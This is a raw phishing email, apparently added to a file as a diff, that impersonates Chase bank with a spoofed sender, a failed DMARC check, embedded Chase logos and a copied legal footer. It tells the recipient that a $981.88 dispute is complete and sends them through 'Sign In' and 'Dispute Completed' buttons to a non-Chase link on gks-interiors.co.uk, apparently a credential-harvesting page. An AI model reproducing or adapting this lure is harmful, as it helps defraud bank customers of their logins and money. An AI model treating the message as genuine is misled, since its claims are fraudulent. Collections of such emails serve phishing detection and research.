@@ -1,0 +1,275 @@
+Return-Path: <chase@kfcreview.com>
+Received: from 59-126-2-228.hinet-ip.hinet.net (59-126-2-228.hinet-ip.hinet.net [59.126.2.228])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id ufpf5g4ta86d2fnsqsc9f5a6sg2q0r2ibeqii5o1
+ for zingerpie@kfcreview.com;
+ Sat, 13 Sep 2025 16:42:40 +0000 (UTC)
+Received-SPF: none (spfCheck: 59.126.2.228 is neither permitted nor denied by domain of kfcreview.com) client-ip=59.126.2.228; envelope-from=chase@kfcreview.com; helo=59-126-2-228.hinet-ip.hinet.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 59.126.2.228 is neither permitted nor denied by domain of kfcreview.com) client-ip=59.126.2.228; envelope-from=chase@kfcreview.com; helo=59-126-2-228.hinet-ip.hinet.net;
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFGL3pJSGdvU3NUOXV6ZE1sMENkQUpIZGNJekQ2bXYrbHo3TDRtOW5YSHZLWFZUZThOUm9QazdpMXFNQy93Z2FyUGZmQ3JNOEZ0azJ4QUhzeFJObjZaYk9taVRIWDZIK3hxS3g3Sk42czdaUVpJKzlqVWtocUcvWHlEdm9IblhycFFqR1JaQUtOMjBPbnBjbktXdU1ib0xRc0FRcndZOFJ1bTRrSW8vNjRmLzlCaXVEMjhmaWhoc29LaXZQWEl1c1FSakNZT2RpWGEzazZlVlVUdDcyaUhNZGRHTGd6d1NzZC9ocWJ1YXpReXY4QlV3bk9IVHp5RUF1ZEg1VER4ZGY3ZUloQStoRnJkc1ZvY052VERBMVQ5dVdYVWZ2b05qK29QTkV6OXlDTlNqNHpwZ2lodldjdUNYdE5CejFzeTBTRWs9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=RZC1bh5cxP4QRoX7e9iY1bC420/V9KWnTlxgf/7lhtghq1V/U4ir03GgJw2FCf2tes0BPYL02iU1VSZmLpPs+vqn4uCuQ98FuQIE3T40lnLyxNVeMn3ShEOlNI/bTQvyot877jfAJ/XDcwqCzxcTNbp5XB7gMPsHvJl0AAoD2p4=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1757781761; v=1; bh=5ul29FGYdcUG8JWrURkWEY2/GYP5t8191qStTM8SSK4=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: Chase < chase@kfcreview.com>
+To: zingerpie@kfcreview.com
+Subject: Completed: View Dispute Status
+Date: 14 Sep 2025 00:42:40 +0800
+Message-ID: <20250914004240.D7423A1A9E731378@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3De633e5c2b7a24719v1darkmode style=3D"BOX-SIZING: border-box; =
+FONT-SIZE: 12px; FONT-FAMILY: verdana; BORDER-TOP-COLOR: rgb(217,217,217); =
+WIDTH: 632px; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: coll=
+apse; TEXT-TRANSFORM: none; WORD-BREAK: normal; BORDER-LEFT-COLOR: rgb(217,=
+217,217); FONT-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; BORDE=
+R-BOTTOM-COLOR: rgb(217,217,217); TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; =
+BORDER-RIGHT-COLOR: rgb(217,217,217); LETTER-SPACING:=20
+normal; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
+text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
+-style: initial; text-decoration-color: initial" cellSpacing=3D0 cellPaddin=
+g=3D0 width=3D"100%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<IMG style=3D"HEIGHT: 148px; WIDTH: 283px" alt=3D"Chase Bank Review: Servic=
+es, Fees, and ..."=20
+src=3D"data:image/png;base64,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
+rkJggg=3D=3D" width=3D302 height=3D166></TD>
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 10px; PADDING-TOP: 10p=
+x; PADDING-LEFT: 25px; PADDING-RIGHT: 25px" align=3Dright><A class=3D7b95c1=
+9c2fa44a43v1webfont style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; TEXT-=
+DECORATION: none; FONT-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(37,=
+95,130); LINE-HEIGHT: normal; BACKGROUND-COLOR: transparent; font-kerning: =
+auto" href=3D"https://gks-interiors.co.uk/js/ch.html" rel=3D"noopener noref=
+errer" target=3D_blank data-link-id=3D"1610">
+<SPAN class=3Dc552f72d03958851v1textLink style=3D"BOX-SIZING: border-box; B=
+ORDER-BOTTOM: rgb(37,95,130) 1px solid; PADDING-BOTTOM: 1px">Sign&nbsp;In</=
+SPAN></A></TD></TR></TBODY></TABLE>
+<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; FONT-FAMILY: verda=
+na; BORDER-TOP-COLOR: rgb(217,217,217); WHITE-SPACE: normal; WORD-SPACING: =
+0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; WORD-BREAK: normal; B=
+ORDER-LEFT-COLOR: rgb(217,217,217); FONT-WEIGHT: 400; COLOR: rgb(44,54,58);=
+ FONT-STYLE: normal; BORDER-BOTTOM-COLOR: rgb(217,217,217); TEXT-ALIGN: lef=
+t; ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-COLOR: rgb(217,217,217); LETTER-SPAC=
+ING: normal; font-variant-ligatures: normal;=20
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial; text-decoration-color: =
+initial" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#013d5b b=
+order=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D7b95c19c2fa44a43v1webfont style=3D"BOX-SIZING: border-box; FONT=
+-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(255,255,255); PADDING-BOT=
+TOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<H1 style=3D"BOX-SIZING: border-box; FONT-SIZE: 20px; FONT-WEIGHT: normal; =
+MARGIN: 0px; LINE-HEIGHT: 26px">Dispute&nbsp;Completed</H1></TD></TR></TBOD=
+Y></TABLE>
+<TABLE class=3De633e5c2b7a24719v1darkmode style=3D"BOX-SIZING: border-box; =
+FONT-SIZE: 12px; FONT-FAMILY: verdana; BORDER-TOP-COLOR: rgb(217,217,217); =
+WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRA=
+NSFORM: none; WORD-BREAK: normal; BORDER-LEFT-COLOR: rgb(217,217,217); FONT=
+-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
+: rgb(217,217,217); TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-C=
+OLOR: rgb(217,217,217); LETTER-SPACING: normal;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3D7b95c19c2fa44a43v1webfont style=3D"BOX-SIZING: border-box; FONT=
+-SIZE: 16px; FONT-FAMILY: arial, helvetica, sans-serif; COLOR: rgb(20,20,20=
+); PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT=
+: 22px; PADDING-RIGHT: 25px">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px 0px 20px">Dear zingerpie,</=
+P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">We have adjusted your paym=
+ent option to reflect a disputed amount&nbsp;of $981.88.<BR><BR>Follow the =
+prompt below to view your dispute status<BR><BR></P></TD></TR></TBODY></TAB=
+LE>
+<TABLE class=3De633e5c2b7a24719v1darkmode style=3D"BOX-SIZING: border-box; =
+FONT-SIZE: 12px; FONT-FAMILY: verdana; BORDER-TOP-COLOR: rgb(217,217,217); =
+WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRA=
+NSFORM: none; WORD-BREAK: normal; BORDER-LEFT-COLOR: rgb(217,217,217); FONT=
+-WEIGHT: 400; COLOR: rgb(44,54,58); FONT-STYLE: normal; BORDER-BOTTOM-COLOR=
+: rgb(217,217,217); TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; BORDER-RIGHT-C=
+OLOR: rgb(217,217,217); LETTER-SPACING: normal;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 wi=
+dth=3D"100%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 10px; =
+TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 25px; PADDING-RIGHT: 25=
+px">
+<DIV class=3D983010faa33cb91fv1cssbutton style=3D"BOX-SIZING: border-box; M=
+AX-WIDTH: 300px; WIDTH: 300px; VERTICAL-ALIGN: top; DISPLAY: inline-block">=
+
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(217,217,217);=
+ BORDER-COLLAPSE: collapse; WORD-BREAK: normal; BORDER-LEFT-COLOR: rgb(217,=
+217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORDER-RIGHT-COLOR: rgb(21=
+7,217,217)" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 48px">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-TOP-COLOR: rgb(217,217,217);=
+ BORDER-COLLAPSE: collapse; WORD-BREAK: normal; BORDER-LEFT-COLOR: rgb(217,=
+217,217); BORDER-BOTTOM-COLOR: rgb(217,217,217); BORDER-RIGHT-COLOR: rgb(21=
+7,217,217)" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box" bgColor=3D#25810e height=3D48>
+<A class=3D7b95c19c2fa44a43v1webfont style=3D"BOX-SIZING: border-box; FONT-=
+SIZE: 20px; TEXT-DECORATION: none; BORDER-TOP: medium none; HEIGHT: 48px; F=
+ONT-FAMILY: arial, helvetica, sans-serif; BORDER-RIGHT: medium none; WIDTH:=
+ 462px; MIN-WIDTH: 300px; BORDER-BOTTOM: medium none; COLOR: rgb(255,255,25=
+5); BORDER-LEFT: medium none; DISPLAY: inline-block; LINE-HEIGHT: 48px; BAC=
+KGROUND-COLOR: transparent; font-kerning: auto" href=3D"https://gks-interio=
+rs.co.uk/js/ch.html" rel=3D"noopener noreferrer"=20
+target=3D_blank data-link-id=3D"1611">
+<P style=3D"BOX-SIZING: border-box; MARGIN-TOP: 0px" align=3Dcenter>Dispute=
+&nbsp;Completed</P></A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>=
+</DIV>
+<P>&nbsp;</P></TD></TR></TBODY></TABLE>&nbsp;&nbsp;&nbsp;&nbsp;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp; <IMG style=3D"HEIGHT: 50px; WIDTH: 56px" alt=3D"Chase - YouTube"=
+=20
+src=3D"data:image/png;base64,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
+kSuQmCC" width=3D223 height=3D224><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thanks for choosing ch=
+ase.<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;=20
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD class=3D"webfont surveyheadline" style=3D"FONT-SIZE: 18px; FONT-FAMILY:=
+ arial, helvetica, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 20px; =
+TEXT-ALIGN: center; PADDING-TOP: 20px; PADDING-LEFT: 25px; LINE-HEIGHT: 24p=
+x; PADDING-RIGHT: 25px">
+<P style=3D"MARGIN: 0px"><STRONG></STRONG>&nbsp;</P></TD></TR></TBODY></TAB=
+LE>
+<TABLE class=3Ddarkmode cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgCo=
+lor=3D#ffffff border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PAD=
+DING-RIGHT: 0px"></TD></TR></TBODY></TABLE>
+<TABLE class=3Dfooter cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=
+=3D0>
+<TBODY>
+<TR>
+<TD class=3Dwebfont style=3D"COLOR: rgb(103,104,104); PADDING-BOTTOM: 20px;=
+ TEXT-ALIGN: left; PADDING-TOP: 20px; FONT: 10px/16px arial, helvetica, san=
+s-serif; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<H2 style=3D"FONT-SIZE: 10px; FONT-WEIGHT: bold; MARGIN: 0px 0px 16px; LINE=
+-HEIGHT: 16px">zingerpie@kfcreview.com<BR><BR><SPAN role=3Dheading style=3D=
+"TEXT-TRANSFORM: uppercase; FONT-WEIGHT: bold">About this message</SPAN><BR=
+><BR>Chase&nbsp;Mobile<SPAN style=3D"FONT-SIZE: 70%; VERTICAL-ALIGN: 3px; L=
+INE-HEIGHT: 0"><FONT size=3D1>&reg;</FONT></SPAN> app is available for sele=
+ct mobile devices. Message and data rates may apply.<BR><BR>This service em=
+ail gives you updates and information about your Chase relationship.<BR>
+<BR>Chase cannot guarantee the delivery of alerts and notifications. Wirele=
+ss or internet service provider outages or other circumstances could delay =
+them. You can always check <SPAN class=3Dapplelinksgray><A style=3D"TEXT-DE=
+CORATION: none; COLOR: #717171">chase.com</A></SPAN> or the Chase&nbsp;Mobi=
+le app for the status of your accounts including your latest account balanc=
+es and transaction details.<BR><BR>
+To protect your personal information, please don't reply to this message. C=
+hase won't ask for confidential information in an email. <BR><BR>If you hav=
+e concerns about the authenticity of this message or have questions about y=
+our account visit <A style=3D"TEXT-DECORATION: underline; COLOR: #0060f0" h=
+ref=3D"https://www.chase.com/digital/customer-service" rel=3D"noreferrer no=
+follow noopener" target=3D_blank>chase.com/CustomerService</A> for ways to =
+contact us.<BR><BR>
+Your privacy is important to us. See our online <A style=3D"TEXT-DECORATION=
+: underline; COLOR: #0060f0" href=3D"https://www.chase.com/digital/resource=
+s/privacy-security" rel=3D"noreferrer nofollow noopener" target=3D_blank>Se=
+curity Center</A> to learn how to protect your information.<BR><BR>&copy; 2=
+025 JPMorgan Chase &amp; Co. </H2></TD></TR></TBODY></TABLE><BR>&nbsp;&nbsp=
+;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
+bsp; </BODY></HTML>
